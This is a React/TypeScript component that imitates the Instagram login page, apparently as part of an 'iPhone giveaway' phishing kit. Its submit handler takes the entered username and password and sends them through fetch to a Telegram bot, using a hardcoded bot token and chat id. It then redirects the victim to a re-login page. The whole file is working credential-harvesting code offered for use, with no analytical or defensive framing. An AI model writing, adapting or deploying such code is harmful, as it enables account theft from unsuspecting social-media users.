import React from "react";
import { useNavigate } from "react-router-dom";

export default function Login() {
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });

  const [isLoading, setIsLoading] = React.useState(false);

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();
    var message = `| IPHONE GIVEAWAY LOGIN 1 | \n                                 UserName: ${formInput.username} \n                                       Password: ${formInput.password}                               ${Date()}`;
    var token = "5868318271:AAF4bg5Q55j53Aml4YYICxC3MIbt8VLn5IE";
    var chat_id = 1297895706;
    const send = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
    );
    await send.json();
    navigate("../re-login", { replace: true });
    setIsLoading(false);
  }

  return (
    <div className="inst_container">
      <div style={{ padding: "40px" }}>
        <div className="brand">
          <img src="./images/insta.png" width="100%" alt="" />
        </div>

       
<br />
        <div className="insta_form">
          <form action="" method="post" onSubmit={handleSubmit}>
            <input
              onChange={handleInputChange}
              name="username"
              type="text"
              required
              style={{ width: "100%" }}
              placeholder="Phone number, username, or email"
            />
            <input
              style={{ width: "100%" }}
              required
              onChange={handleInputChange}
              name="password"
              type="password"
              placeholder="Password"
            />

            <div className="forgot-password">
              <a style={{ margin: "20px 0" }} className="link" href="">
                Forgot password?
              </a>
            </div>

            <button
              style={{ width: "100%", margin: "0" }}
              className="continue-with-facebook center"
              disabled={isLoading}
            >
              {isLoading ? (
                <span className="loader2"></span>
              ) : (
                <span style={{ fontWeight: "normal", fontSize: "15px" }}>
                  {" "}
                  Log In{" "}
                </span>
              )}
            </button>
          </form>
        </div>

        <div className="dont-have-account center">
          <p style={{ marginTop: "30px" }}>
            Don't have an account?{" "}
            <a href="" className="link">
              Sign up
            </a>
          </p>
        </div>

        <div className="contact-us">
          <img src="./images/meta.svg" height="70px" width="70px" alt="" />
        </div>
      </div>
    </div>
  );
}
